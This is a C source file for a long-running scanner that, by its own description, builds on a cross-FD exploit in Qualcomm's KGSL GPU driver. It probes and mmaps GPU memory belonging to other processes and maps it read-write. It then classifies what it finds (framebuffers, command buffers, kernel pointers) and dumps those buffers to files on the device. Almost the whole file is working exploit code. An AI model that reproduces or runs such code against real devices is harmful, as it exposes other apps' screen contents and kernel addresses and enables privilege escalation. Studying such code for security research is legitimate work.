/*
 * kgsl_auto_scanner.c - Automated KGSL Address Scanner & Content Analyzer
 *
 * Integrates CVE-2025-21479 Cross-FD exploit into a long-running scanner:
 * 1. Continuously scans KGSL address space
 * 2. Detects state changes (free/alloc transitions)
 * 3. Captures buffers when they become accessible
 * 4. Analyzes content for signatures (framebuffer, command buffer, etc.)
 * 5. Logs all findings for later analysis
 *
 * Designed for long-duration monitoring on the glasses
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>

/* KGSL Definitions */
struct kgsl_gpuobj_alloc
{
    uint64_t size;
    uint64_t flags;
    uint64_t va_len;
    uint64_t mmapaddr;
    uint64_t id;
    uint64_t metadata_len;
    uint64_t metadata;
};

#define KGSL_IOC_TYPE 0x09
#define IOCTL_KGSL_GPUOBJ_ALLOC \
    _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)

/* Configuration */
#define SCAN_RANGE_START 0x1000
#define SCAN_RANGE_END 0x400000 // 4MB range
#define MAX_CAPTURED 256
#define LOG_FILE "/data/local/tmp/kgsl_scan.log"
#define DUMP_DIR "/data/local/tmp/kgsl_dumps"

/* Global state */
static volatile int g_running = 1;
static int g_kgsl_fd = -1;
static FILE *g_log = NULL;

/* Capture record */
typedef struct
{
    uint64_t addr;
    void *mapping;
    time_t capture_time;
    char type[32];
    uint64_t hash;
    int written;
} capture_t;

static capture_t captures[MAX_CAPTURED];
static int num_captures = 0;

/* Address state tracking */
typedef struct
{
    uint64_t addr;
    int state; // 0=free, 1=ERANGE, 2=accessible
    time_t last_seen;
    int access_count;
} addr_state_t;

#define MAX_ADDRS 8192
static addr_state_t addr_states[MAX_ADDRS];
static int num_addrs = 0;

/* Statistics */
static struct
{
    uint64_t scan_count;
    uint64_t state_changes;
    uint64_t captures;
    uint64_t kernel_ptrs_found;
    uint64_t framebuffers_found;
    uint64_t cmd_buffers_found;
} stats;

void signal_handler(int sig)
{
    g_running = 0;
}

void log_msg(const char *fmt, ...)
{
    va_list args;
    va_start(args, fmt);

    char timebuf[32];
    time_t now = time(NULL);
    strftime(timebuf, sizeof(timebuf), "%H:%M:%S", localtime(&now));

    printf("[%s] ", timebuf);
    vprintf(fmt, args);
    printf("\n");

    if (g_log)
    {
        fprintf(g_log, "[%s] ", timebuf);
        va_start(args, fmt);
        vfprintf(g_log, fmt, args);
        fprintf(g_log, "\n");
        fflush(g_log);
    }

    va_end(args);
}

uint64_t compute_hash(void *buf, size_t len)
{
    uint64_t hash = 0x14650FB0739D0383ULL;
    uint64_t *ptr = (uint64_t *)buf;
    for (size_t i = 0; i < len / 8; i++)
    {
        hash ^= ptr[i];
        hash = (hash << 13) | (hash >> 51);
        hash *= 0x5851F42D4C957F2DULL;
    }
    return hash;
}

/* Content type detection */
typedef enum
{
    CONTENT_UNKNOWN,
    CONTENT_ZEROED,
    CONTENT_FRAMEBUFFER,
    CONTENT_COMMAND_BUFFER,
    CONTENT_KERNEL_STRUCTURE,
    CONTENT_TEXTURE,
    CONTENT_SHADER,
} content_type_t;

content_type_t analyze_content(void *buf, size_t len, char *type_str)
{
    uint32_t *u32 = (uint32_t *)buf;
    uint64_t *u64 = (uint64_t *)buf;

    /* Count zeros */
    int zero_count = 0;
    for (int i = 0; i < 512 && i * 8 < len; i++)
    {
        if (u64[i] == 0)
            zero_count++;
    }
    if (zero_count > 480)
    {
        strcpy(type_str, "ZEROED");
        return CONTENT_ZEROED;
    }

    /* Check for PM4 command buffer signatures */
    int pm4_count = 0;
    for (int i = 0; i < 64 && i * 4 < len; i++)
    {
        uint32_t header = u32[i];
        /* Type 3: 0xC0xxxxxx, Type 7: 0x70xxxxxx */
        if ((header & 0xF0000000) == 0xC0000000 ||
            (header & 0xF0000000) == 0x70000000)
        {
            pm4_count++;
        }
    }
    if (pm4_count > 10)
    {
        strcpy(type_str, "COMMAND_BUFFER");
        stats.cmd_buffers_found++;
        return CONTENT_COMMAND_BUFFER;
    }

    /* Check for kernel pointers */
    int kernel_ptr_count = 0;
    for (int i = 0; i < 512 && i * 8 < len; i++)
    {
        if ((u64[i] >> 48) == 0xFFFF)
        {
            kernel_ptr_count++;
        }
    }
    if (kernel_ptr_count > 2)
    {
        sprintf(type_str, "KERNEL_STRUCT(%d ptrs)", kernel_ptr_count);
        stats.kernel_ptrs_found += kernel_ptr_count;
        return CONTENT_KERNEL_STRUCTURE;
    }

    /* Check for framebuffer pattern (RGBA pixels) */
    int alpha_ff = 0, alpha_00 = 0;
    for (int i = 0; i < 256 && i * 4 < len; i++)
    {
        uint32_t pixel = u32[i];
        uint8_t alpha = (pixel >> 24) & 0xFF;
        if (alpha == 0xFF)
            alpha_ff++;
        if (alpha == 0x00)
            alpha_00++;
    }
    if (alpha_ff > 200 || alpha_00 > 200)
    {
        strcpy(type_str, "FRAMEBUFFER");
        stats.framebuffers_found++;
        return CONTENT_FRAMEBUFFER;
    }

    /* Check for shader signatures */
    if (u32[0] == 0x00000002 || u32[0] == 0x00000003)
    {
        /* Common shader binary headers */
        strcpy(type_str, "SHADER");
        return CONTENT_SHADER;
    }

    strcpy(type_str, "UNKNOWN");
    return CONTENT_UNKNOWN;
}

/* Probe an address */
int probe_addr(uint64_t addr)
{
    void *mem = mmap(NULL, 0x1000, PROT_READ,
                     MAP_SHARED, g_kgsl_fd, addr);

    if (mem == MAP_FAILED)
    {
        if (errno == ERANGE)
            return 1; // Other process
        return 0;     // Not allocated
    }

    munmap(mem, 0x1000);
    return 2; // Accessible
}

/* Capture a buffer */
int capture_addr(uint64_t addr)
{
    if (num_captures >= MAX_CAPTURED)
        return -1;

    void *mem = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                     MAP_SHARED, g_kgsl_fd, addr);
    if (mem == MAP_FAILED)
        return -1;

    capture_t *cap = &captures[num_captures];
    cap->addr = addr;
    cap->mapping = mem;
    cap->capture_time = time(NULL);
    cap->hash = compute_hash(mem, 0x1000);
    cap->written = 0;

    analyze_content(mem, 0x1000, cap->type);

    num_captures++;
    stats.captures++;

    return num_captures - 1;
}

/* Dump captured buffer to file */
void dump_capture(int idx)
{
    if (idx < 0 || idx >= num_captures)
        return;

    capture_t *cap = &captures[idx];
    if (cap->written || !cap->mapping)
        return;

    char filename[256];
    snprintf(filename, sizeof(filename),
             "%s/dump_%05llx_%s_%llu.bin",
             DUMP_DIR, (unsigned long long)cap->addr,
             cap->type, (unsigned long long)cap->capture_time);

    int fd = open(filename, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd >= 0)
    {
        write(fd, cap->mapping, 0x1000);
        close(fd);
        cap->written = 1;
        log_msg("Dumped capture %d to %s", idx, filename);
    }
}

/* Find or create addr state entry */
addr_state_t *get_addr_state(uint64_t addr)
{
    for (int i = 0; i < num_addrs; i++)
    {
        if (addr_states[i].addr == addr)
        {
            return &addr_states[i];
        }
    }

    if (num_addrs >= MAX_ADDRS)
        return NULL;

    addr_state_t *s = &addr_states[num_addrs++];
    s->addr = addr;
    s->state = -1; // Unknown
    s->last_seen = 0;
    s->access_count = 0;

    return s;
}

/* Main scanning loop */
void scan_loop(int duration_sec)
{
    log_msg("Starting scan loop (duration: %d seconds)", duration_sec);

    time_t start = time(NULL);
    uint64_t addr = SCAN_RANGE_START;

    /* Create dump directory */
    mkdir(DUMP_DIR, 0755);

    while (g_running && (duration_sec <= 0 || (time(NULL) - start) < duration_sec))
    {
        /* Probe current address */
        int state = probe_addr(addr);

        addr_state_t *as = get_addr_state(addr);
        if (as)
        {
            if (as->state >= 0 && as->state != state)
            {
                /* State changed! */
                stats.state_changes++;
                log_msg("CHANGE 0x%05llx: %d -> %d",
                        (unsigned long long)addr, as->state, state);

                /* If became accessible, try to capture */
                if (state == 2 && as->state != 2)
                {
                    int cap = capture_addr(addr);
                    if (cap >= 0)
                    {
                        log_msg("CAPTURED 0x%05llx: %s (hash=0x%016llx)",
                                (unsigned long long)addr,
                                captures[cap].type,
                                (unsigned long long)captures[cap].hash);

                        /* Immediately dump interesting captures */
                        if (strstr(captures[cap].type, "KERNEL") ||
                            strstr(captures[cap].type, "COMMAND"))
                        {
                            dump_capture(cap);
                        }
                    }
                }
            }

            as->state = state;
            as->last_seen = time(NULL);
            if (state == 2)
                as->access_count++;
        }

        /* Move to next address */
        addr += 0x1000;
        if (addr >= SCAN_RANGE_END)
        {
            addr = SCAN_RANGE_START;
            stats.scan_count++;

            /* Periodic status */
            if (stats.scan_count % 10 == 0)
            {
                log_msg("STATUS: scans=%llu addrs=%d changes=%llu captures=%d "
                        "kptrs=%llu fb=%llu cmd=%llu",
                        (unsigned long long)stats.scan_count,
                        num_addrs,
                        (unsigned long long)stats.state_changes,
                        num_captures,
                        (unsigned long long)stats.kernel_ptrs_found,
                        (unsigned long long)stats.framebuffers_found,
                        (unsigned long long)stats.cmd_buffers_found);
            }
        }

        /* Small delay to avoid CPU hogging */
        usleep(100); // 0.1ms per probe
    }
}

/* Final report */
void print_report(void)
{
    log_msg("=== FINAL REPORT ===");
    log_msg("Total scans: %llu", (unsigned long long)stats.scan_count);
    log_msg("Addresses tracked: %d", num_addrs);
    log_msg("State changes: %llu", (unsigned long long)stats.state_changes);
    log_msg("Buffers captured: %d", num_captures);
    log_msg("Kernel pointers found: %llu", (unsigned long long)stats.kernel_ptrs_found);
    log_msg("Framebuffers found: %llu", (unsigned long long)stats.framebuffers_found);
    log_msg("Command buffers found: %llu", (unsigned long long)stats.cmd_buffers_found);

    /* List interesting captures */
    log_msg("--- Interesting Captures ---");
    for (int i = 0; i < num_captures; i++)
    {
        if (strstr(captures[i].type, "KERNEL") ||
            strstr(captures[i].type, "COMMAND") ||
            strstr(captures[i].type, "FRAMEBUFFER"))
        {

            log_msg("  [%d] 0x%05llx: %s", i,
                    (unsigned long long)captures[i].addr,
                    captures[i].type);

            /* Print first 32 bytes */
            if (captures[i].mapping)
            {
                uint64_t *p = (uint64_t *)captures[i].mapping;
                log_msg("      Data: %016llx %016llx %016llx %016llx",
                        (unsigned long long)p[0],
                        (unsigned long long)p[1],
                        (unsigned long long)p[2],
                        (unsigned long long)p[3]);
            }
        }
    }

    /* Dump remaining captures */
    for (int i = 0; i < num_captures; i++)
    {
        dump_capture(i);
    }
}

/* Cleanup */
void cleanup(void)
{
    for (int i = 0; i < num_captures; i++)
    {
        if (captures[i].mapping)
        {
            munmap(captures[i].mapping, 0x1000);
        }
    }

    if (g_kgsl_fd >= 0)
        close(g_kgsl_fd);
    if (g_log)
        fclose(g_log);
}

int main(int argc, char **argv)
{
    printf("=== KGSL Automated Address Scanner ===\n");
    printf("CVE-2025-21479 Cross-FD Exploit Integration\n\n");

    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    /* Parse arguments */
    int duration = 300; // Default 5 minutes
    if (argc > 1)
    {
        duration = atoi(argv[1]);
        if (duration <= 0)
            duration = 300;
    }

    /* Open log file */
    g_log = fopen(LOG_FILE, "a");
    if (!g_log)
    {
        printf("[!] Cannot open log file, continuing without logging\n");
    }

    /* Open KGSL */
    g_kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (g_kgsl_fd < 0)
    {
        perror("Cannot open KGSL");
        return 1;
    }

    log_msg("Scanner started (duration: %d sec, range: 0x%x-0x%x)",
            duration, SCAN_RANGE_START, SCAN_RANGE_END);
    log_msg("Log: %s, Dumps: %s/", LOG_FILE, DUMP_DIR);

    /* Run scanner */
    scan_loop(duration);

    /* Report and cleanup */
    print_report();
    cleanup();

    printf("\n=== Done ===\n");
    return 0;
}
